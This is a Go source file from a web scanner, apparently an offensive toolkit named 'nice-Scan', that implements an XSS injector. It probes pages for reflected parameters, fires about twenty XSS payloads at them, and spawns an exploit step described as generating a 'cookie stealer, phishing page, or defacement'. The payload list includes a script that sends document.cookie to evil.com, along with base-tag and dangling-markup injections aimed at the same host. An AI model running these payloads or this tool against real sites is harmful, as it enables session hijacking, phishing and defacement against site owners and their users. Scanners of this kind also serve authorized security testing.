package hacker

import (
	"context"
	"fmt"
	"strings"

	"github.com/NICE-DEV226/nice-Scan/internal/transport"
	"github.com/NICE-DEV226/nice-Scan/internal/types"
)

type XSSAction struct{}

func (a *XSSAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "XSS Injector",
		Description: "Context-aware XSS payload delivery — <script>, onerror, svg, eval",
		Priority:    45,
		Requires:    []string{"has_xss"},
		Provides:    []string{"has_xss_exploit"},
	}
}

var xssPayloads = []struct {
	name    string
	payload string
}{
	{"HTML <script>", "<script>alert(1)</script>"},
	{"HTML <img onerror>", "<img src=x onerror=alert(1)>"},
	{"HTML <svg>", "<svg onload=alert(1)>"},
	{"HTML <body>", "<body onload=alert(1)>"},
	{"HTML <input>", "<input autofocus onfocus=alert(1)>"},
	{"HTML <details>", "<details open ontoggle=alert(1)>"},
	{"HTML <a>", "<a href=javascript:alert(1)>click</a>"},
	{"JS eval", "';alert(1);//"},
	{"JS eval2", "\";alert(1);//"},
	{"JS onerror", "onerror=alert(1)"},
	{"URL javascript:", "javascript:alert(1)"},
	{"HTML <iframe>", "<iframe onload=alert(1)>"},
	{"HTML <math>", "<math><mi xlink:href=javascript:alert(1)>"},
	{"HTML <link>", "<link rel=stylesheet href=javascript:alert(1)>"},
	{"HTML <table>", "<table background=javascript:alert(1)>"},
	{"Polyglot", "\"'><img src=x onerror=alert(1)>"},
	{"Dangling markup", "<img src=\"http://evil.com/log.cgi?"},
	{"Unclosed <script>", "<script>fetch('http://evil.com/'+document.cookie)</script>"},
	{"Event handler", "\" onmouseover=\"alert(1)"},
	{"Base tag injection", "<base href=http://evil.com>"},
	{"CSS expression", "<div style=\"x:expression(alert(1))\">"},
}

func (a *XSSAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	pages := kb.GetPages()
	if len(pages) == 0 {
		return ActionResult{}
	}

	for _, page := range pages {
		select {
		case <-ctx.Done():
			return ActionResult{Findings: findings, Actions: spawned}
		default:
		}

		reflectedParams := findReflectedParams(ctx, client, page.URL, kb)
		if len(reflectedParams) == 0 {
			continue
		}

		findings = append(findings, Finding{
			Type:        "xss_reflection_points",
			Name:        fmt.Sprintf("XSS reflection points found on %s", page.URL),
			Severity:    SevHigh,
			Description: fmt.Sprintf("Parameters reflect input: %s", strings.Join(reflectedParams, ", ")),
		})

		for _, param := range reflectedParams {
			for _, p := range xssPayloads {
				select {
				case <-ctx.Done():
					return ActionResult{Findings: findings, Actions: spawned}
				default:
				}

				testURL := page.URL
				if strings.Contains(testURL, "?") {
					testURL += "&" + param + "=" + strings.ReplaceAll(p.payload, " ", "%20")
				} else {
					testURL += "?" + param + "=" + strings.ReplaceAll(p.payload, " ", "%20")
				}

				resp, err := client.Do(ctx, &types.Request{
					Method: "GET",
					URL:    testURL,
				})
				if err != nil {
					continue
				}

				body := string(resp.Body)
				if strings.Contains(body, p.payload) || strings.Contains(body, strings.ReplaceAll(p.payload, " ", "%20")) {
					findings = append(findings, Finding{
						Type:        "xss_confirmed",
						Name:        fmt.Sprintf("XSS: %s via param %s", p.name, param),
						Severity:    SevHigh,
						Description: fmt.Sprintf("Payload reflected: %s", p.payload),
						Evidence:    fmt.Sprintf("URL: %s\nPayload: %s", testURL, p.payload),
					})

					kb.AddCapability(Capability{
						Name:   "has_xss_exploit",
						Target: target,
						Details: map[string]string{
							"param":   param,
							"payload": p.payload,
							"url":     testURL,
						},
					})

					spawned = append(spawned, &XSSExploitAction{
						vulnURL:   testURL,
						param:     param,
						payload:   p.payload,
						technique: p.name,
					})
					break
				}
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

type XSSExploitAction struct {
	vulnURL   string
	param     string
	payload   string
	technique string
}

func (a *XSSExploitAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "XSS Exploit",
		Description: "Generate XSS PoC — steal cookies, redirect, deface",
		Priority:    46,
		Requires:    []string{},
		Provides:    []string{},
	}
}

func (a *XSSExploitAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	cookieStealer := fmt.Sprintf("PoC URL: %s", a.vulnURL)

	return ActionResult{
		Findings: []Finding{
			{
				Type:        "xss_poc",
				Name:        fmt.Sprintf("XSS Exploit: %s", a.technique),
				Severity:    SevCritical,
				Description: "XSS payload confirmed — generate cookie stealer, phishing page, or defacement",
				Evidence:    cookieStealer,
			},
		},
	}
}

func findReflectedParams(ctx context.Context, client *transport.Client, pageURL string, kb *Knowledge) []string {
	testPayload := "REFLECTED_PARAM_TEST_" + fmt.Sprintf("%d", strings.Count(pageURL, "/"))

	var candidates []string
	u := pageURL
	if strings.Contains(u, "?") {
		parts := strings.SplitN(u, "?", 2)
		base := parts[0]
		params := strings.Split(parts[1], "&")
		for _, param := range params {
			pair := strings.SplitN(param, "=", 2)
			if len(pair) == 2 && len(pair[0]) > 0 {
				testURL := base + "?" + pair[0] + "=" + testPayload
				resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: testURL})
				if err != nil {
					continue
				}
				body := string(resp.Body)
				if strings.Contains(body, testPayload) || strings.Contains(body, strings.ReplaceAll(testPayload, "_", "%5F")) {
					candidates = append(candidates, pair[0])
				}
			}
		}
	}

	if len(candidates) == 0 {
		commonParams := []string{"q", "s", "search", "query", "id", "page", "p", "name", "user", "message", "text", "comment", "content", "title", "url", "file", "path", "redirect"}
		for _, param := range commonParams {
			testURL := pageURL + "?" + param + "=" + testPayload
			resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: testURL})
			if err != nil {
				continue
			}
			body := string(resp.Body)
			if strings.Contains(body, testPayload) || strings.Contains(body, strings.ReplaceAll(testPayload, "_", "%5F")) {
				candidates = append(candidates, param)
			}
		}
	}

	return candidates
}
